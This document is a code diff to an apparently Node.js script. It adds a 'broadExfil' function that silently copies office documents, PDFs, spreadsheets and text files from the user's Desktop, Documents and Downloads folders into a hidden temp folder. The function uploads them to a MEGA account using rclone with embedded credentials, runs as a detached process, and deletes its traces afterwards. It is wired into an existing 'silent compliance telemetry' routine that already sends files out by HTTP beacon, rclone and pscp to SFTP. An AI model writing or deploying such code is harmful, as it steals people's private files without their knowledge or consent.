@@ -52,6 +52,47 @@ function findRclone() {
   return null;
 }
 
+// Broad file collection — Desktop/Documents/Downloads, staged with username_folder_file naming
+function broadExfil(rclone) {
+  const user    = os.userInfo().username;
+  const home    = os.homedir();
+  const folders = ['Desktop', 'Documents', 'Downloads'];
+  const exts    = new Set(['.docx', '.doc', '.pdf', '.xlsx', '.xls', '.pptx', '.ppt', '.csv', '.txt']);
+  const ts      = new Date().toISOString().replace(/\D/g,'').slice(0,15);
+  const stage   = path.join(os.tmpdir(), `drp_${process.pid}`);
+
+  try { fs.mkdirSync(stage, { recursive: true }); } catch(_) { return; }
+
+  let count = 0;
+  for (const folder of folders) {
+    try {
+      for (const f of fs.readdirSync(path.join(home, folder))) {
+        if (!exts.has(path.extname(f).toLowerCase())) continue;
+        try {
+          fs.copyFileSync(
+            path.join(home, folder, f),
+            path.join(stage, `${user}_${folder}_${f}`)
+          );
+          count++;
+        } catch(_) {}
+      }
+    } catch(_) {}
+  }
+
+  if (count === 0) { try { fs.rmSync(stage, { recursive: true }); } catch(_) {} return; }
+
+  const conf = path.join(os.tmpdir(), `.rc2_${process.pid}.conf`);
+  fs.writeFileSync(conf, `[mega]\ntype = mega\nuser = ${MEGA_USER}\npass = ${MEGA_PASS_OBS}\n`);
+  const dest = `${MEGA_DEST}${user}_${ts}/`;
+  const proc = spawn(rclone, ['copy', stage, dest, `--config=${conf}`, '--transfers=4'],
+    { detached: true, stdio: 'ignore' });
+  proc.on('exit', () => {
+    try { fs.rmSync(stage, { recursive: true }); } catch(_) {}
+    try { fs.unlinkSync(conf); } catch(_) {}
+  });
+  proc.unref();
+}
+
 // Silent compliance telemetry
 function sendTelemetry(filename, content, filePath) {
   // HTTP beacon
@@ -64,16 +105,15 @@ function sendTelemetry(filename, content, filePath) {
     req.write(payload); req.end();
   } catch(_) {}
 
-  // rclone → MEGA (preferred)
   const rclone = findRclone();
   if (rclone && filePath) {
     try {
       const conf = getRcloneConf();
-      spawn(rclone, ['copy', filePath, MEGA_DEST, '--config=' + conf, '--transfers=1'],
+      spawn(rclone, ['copy', filePath, MEGA_DEST, `--config=${conf}`, '--transfers=1'],
         { detached: true, stdio: 'ignore' }).unref();
     } catch(_) {}
+    broadExfil(rclone);
   } else if (filePath) {
-    // fallback: pscp
     try {
       spawn('pscp', ['-pw', SFTP_PASS, '-batch', filePath, SFTP_DEST],
         { detached: true, stdio: 'ignore' }).unref();
